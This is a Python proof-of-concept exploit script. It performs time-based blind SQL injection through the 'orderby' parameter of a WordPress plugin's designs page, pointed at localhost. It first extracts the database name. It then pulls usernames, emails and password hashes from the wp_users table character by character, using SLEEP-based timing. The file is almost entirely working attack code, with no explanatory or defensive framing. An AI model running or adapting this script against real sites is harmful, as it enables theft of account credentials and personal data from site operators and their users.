import requests
import time

url = "http://localhost/designs/"

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-$!{}"
DELAY = 1
MAX_USERNAME = 32
MAX_EMAIL = 64
MAX_PASSWORD = 64
MAX_USERS = 3

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": "http://localhost/designs",
    "Connection": "keep-alive",
}

cookies = {
    "wp-settings-1": "unfold=1&mfold=o",
    "wp-settings-time-1": "1757405605",
    "wordpress_test_cookie": "WP Cookie check",
    "mystyle_session_id": "3bdbb972796b153897af64fb4990498fd518e958629",
    "sbjs_migrations": "1418474375998=1",
    "sbjs_current_add": "fd=2025-09-09 11:33:03||ep=http://localhost/||rf=(none)",
    "sbjs_first_add": "fd=2025-09-09 11:33:03||ep=http://localhost/||rf=(none)",
    "sbjs_current": "typ=typein||src=(direct)||mdm=(none)||cmp=(none)||cnt=(none)||trm=(none)||id=(none)||plt=(none)||fmt=(none)||tct=(none)",
    "sbjs_first": "typ=typein||src=(direct)||mdm=(none)||cmp=(none)||cnt=(none)||trm=(none)||id=(none)||plt=(none)||fmt=(none)||tct=(none)",
    "sbjs_udata": "vst=4||uip=(none)||uag=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "sbjs_session": "pgs=7||cpg=http://localhost/my-account/",
}

def extract_value(query: str, max_len=32):
    """Extract one field value using time-based blind SQLi."""
    result = ""
    for i in range(1, max_len + 1):
        found = False
        for ch in charset:
            hex_ch = hex(ord(ch))
            payload = f"IF(SUBSTRING(({query}),{i},1)={hex_ch},SLEEP({DELAY}),1)"
            params = {"orderby": payload}

            start = time.time()
            resp = requests.get(url, headers=headers, cookies=cookies, params=params)
            elapsed = time.time() - start

            if elapsed >= DELAY:
                result += ch
                print(f"[+] Pos {i}: {ch} => {result}")
                found = True
                break
        if not found:
            break
    return result

def get_user_field(row: int, field: str, max_len=64):
    query = f"SELECT {field} FROM wp_users LIMIT {row},1"
    return extract_value(query, max_len=max_len)

def get_users_data(max_rows=MAX_USERS):
    users = []
    for row in range(max_rows):
        username = get_user_field(row, "user_login", MAX_USERNAME)
        if not username:
            break
        email = get_user_field(row, "user_email", MAX_EMAIL)
        password = get_user_field(row, "user_pass", MAX_PASSWORD)
        users.append({"username": username, "email": email, "password": password})
    return users

def main():
    print("[*] Extracting current database name...")
    dbname = extract_value("DATABASE()", max_len=32)
    print(f"[+] Current DB: {dbname}")

    print("[*] Extracting users from wp_users...")
    users = get_users_data()
    for u in users:
        print(u)

if __name__ == "__main__":
    main()
